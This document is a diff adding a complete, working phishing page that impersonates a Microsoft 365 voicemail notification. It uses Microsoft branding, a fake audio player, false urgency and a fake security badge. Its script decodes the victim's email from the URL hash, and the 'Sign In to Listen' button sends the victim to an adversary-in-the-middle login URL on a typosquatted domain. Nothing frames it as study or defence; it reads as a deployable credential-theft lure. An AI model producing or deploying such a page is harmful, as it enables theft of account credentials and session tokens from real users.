@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>You have a new voicemail - Microsoft 365</title>
+<link rel="icon" href="https://res-1.cdn.office.net/files/fabric-cdn-prod_20230815.002/assets/brand-icons/product/svg/outlook_32x1.svg">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Segoe UI',system-ui,sans-serif;background:#f5f5f5;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+.card{background:#fff;border-radius:8px;box-shadow:0 2px 8px rgba(0,0,0,.08);max-width:480px;width:100%;overflow:hidden}
+.header{background:#0078d4;padding:20px 28px;display:flex;align-items:center;gap:12px}
+.header svg{width:28px;height:28px;fill:#fff}
+.header h1{color:#fff;font-size:16px;font-weight:600}
+.body{padding:28px}
+.vm-info{background:#f8f8f8;border-radius:8px;padding:20px;margin-bottom:20px}
+.vm-row{display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px solid #eee;font-size:13px}
+.vm-row:last-child{border:none}
+.vm-label{color:#666;font-weight:500}
+.vm-value{color:#333;font-weight:600}
+.player{background:#f0f0f0;border-radius:24px;padding:12px 20px;display:flex;align-items:center;gap:12px;margin:20px 0}
+.play-btn{width:36px;height:36px;background:#0078d4;border-radius:50%;display:flex;align-items:center;justify-content:center;cursor:pointer}
+.play-btn svg{fill:#fff;width:14px;height:14px;margin-left:2px}
+.waveform{flex:1;height:32px;display:flex;align-items:center;gap:2px}
+.wave-bar{width:3px;background:#0078d4;border-radius:2px;opacity:.6}
+.duration{font-size:12px;color:#666;font-weight:500}
+.btn{display:block;width:100%;padding:14px;background:#0078d4;color:#fff;border:none;border-radius:6px;font-size:14px;font-weight:600;cursor:pointer;text-align:center;text-decoration:none;margin-top:20px}
+.btn:hover{background:#106ebe}
+.note{text-align:center;font-size:11px;color:#999;margin-top:16px;line-height:1.5}
+.lock{display:inline-flex;align-items:center;gap:4px;color:#107c10;font-size:11px;margin-top:8px}
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="header">
+    <svg viewBox="0 0 24 24"><path d="M20 15.5c-1.25 0-2.45-.2-3.57-.57a1.02 1.02 0 00-1.02.24l-2.2 2.2a15.045 15.045 0 01-6.59-6.59l2.2-2.21a.96.96 0 00.25-1A11.36 11.36 0 018.5 4c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1 0 9.39 7.61 17 17 17 .55 0 1-.45 1-1v-3.5c0-.55-.45-1-1-1z"/></svg>
+    <h1>New Voicemail Message</h1>
+  </div>
+  <div class="body">
+    <div class="vm-info">
+      <div class="vm-row"><span class="vm-label">From</span><span class="vm-value" id="vmFrom">+1 (425) 555-0147</span></div>
+      <div class="vm-row"><span class="vm-label">Date</span><span class="vm-value" id="vmDate">Today</span></div>
+      <div class="vm-row"><span class="vm-label">Duration</span><span class="vm-value">0:47</span></div>
+      <div class="vm-row"><span class="vm-label">Urgency</span><span class="vm-value" style="color:#d83b01">High</span></div>
+    </div>
+
+    <div class="player">
+      <div class="play-btn"><svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg></div>
+      <div class="waveform" id="waveform"></div>
+      <span class="duration">0:47</span>
+    </div>
+
+    <p style="font-size:13px;color:#555;margin:16px 0;line-height:1.5">
+      Sign in to Microsoft 365 to listen to your voicemail or view the transcript.
+    </p>
+
+    <a class="btn" id="listenBtn" href="#">Sign In to Listen</a>
+
+    <div class="note">
+      <span class="lock">&#128274; Protected by Microsoft 365 security</span><br>
+      You received this notification because voicemail-to-email is enabled on your account.
+    </div>
+  </div>
+</div>
+
+<script>
+(function(){
+  // Generate waveform bars
+  const wf = document.getElementById('waveform');
+  for(let i=0;i<35;i++){
+    const bar = document.createElement('div');
+    bar.className = 'wave-bar';
+    bar.style.height = (Math.random()*20+6)+'px';
+    wf.appendChild(bar);
+  }
+
+  // Set today's date
+  const now = new Date();
+  document.getElementById('vmDate').textContent = now.toLocaleDateString('en-US',{weekday:'long',month:'short',day:'numeric'}) + ' at ' + now.toLocaleTimeString('en-US',{hour:'numeric',minute:'2-digit'});
+
+  const hash = window.location.hash.slice(1);
+  const email = hash ? atob(hash) : '';
+  const AITM_URL = 'https://login.hoosiermachlnery.com/AciOKxaR';
+
+  document.getElementById('listenBtn').addEventListener('click', function(e){
+    e.preventDefault();
+    this.textContent = 'Connecting...';
+    this.style.background = '#555';
+    setTimeout(function(){
+      window.location.href = AITM_URL + (email ? '?e=' + encodeURIComponent(email) : '');
+    }, 600);
+  });
+})();
+</script>
+</body>
+</html>
